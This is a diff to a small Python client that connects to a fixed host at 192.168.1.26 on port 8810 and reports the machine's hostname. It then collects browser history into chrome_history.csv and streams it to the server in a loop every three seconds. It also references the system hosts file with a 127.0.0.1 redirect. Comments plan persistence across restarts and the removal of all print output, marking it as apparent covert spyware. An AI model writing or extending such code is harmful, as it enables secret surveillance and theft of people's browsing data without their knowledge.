@@ -2,34 +2,36 @@ import socket,os,time
 import browserhistory as bh
 from datetime import datetime as dt
 
-
 linux_host = '/etc/hosts'
 window_host = r"C:\Windows\System32\drivers\etc\hosts"
 default_folder = window_host 
 redirect = "127.0.0.1"
 
-class Client():#To do :always on - turns on restart, all print() wiil be deleted
-    def __init__(self, port=8810, ip="0.0.0.0"):
+class Client():#TODO: complete self.run, always on - turns on restart, all print() wiil be deleted
+    def __init__(self, port=8810, ip="192.168.1.26"):# ip wiil change
         self.s = socket.socket()
         self.s.connect((ip,port))
         print("connected")    
     
     def run(self):
         self.first_message()
-    
+        while True:
+            time.sleep(3)
+            self.info()
+            #TODO def recv limititon
     def first_message(self):
         self.s.send(f"name%{socket.gethostname()}".encode())
         
     def info(self):
-        self.s.send("history".encode())   
+        self.s.send("history".encode())
+        bh.get_browserhistory()   
         bh.write_browserhistory_csv()
-        f = open("chrome_history", "rb")
+        f = open("chrome_history.csv", "rb")
         print ("Sending Data ....")
-        l = f.read()
-        while True:      
-            for line in l:
-                self.s.send(line)    
-            break
+        l = f.read(1024)
+        while (l):
+            self.s.send(l)
+            l = f.read(1024)
         f.close()
         print("Sending Complete")
             
@@ -55,8 +57,7 @@ class Client():#To do :always on - turns on restart, all print() wiil be deleted
 
 def main():
    client = Client()
-   client.first_message()
-   client.info()
-     
+   client.run() 
+
 if __name__ == "__main__":
     main()
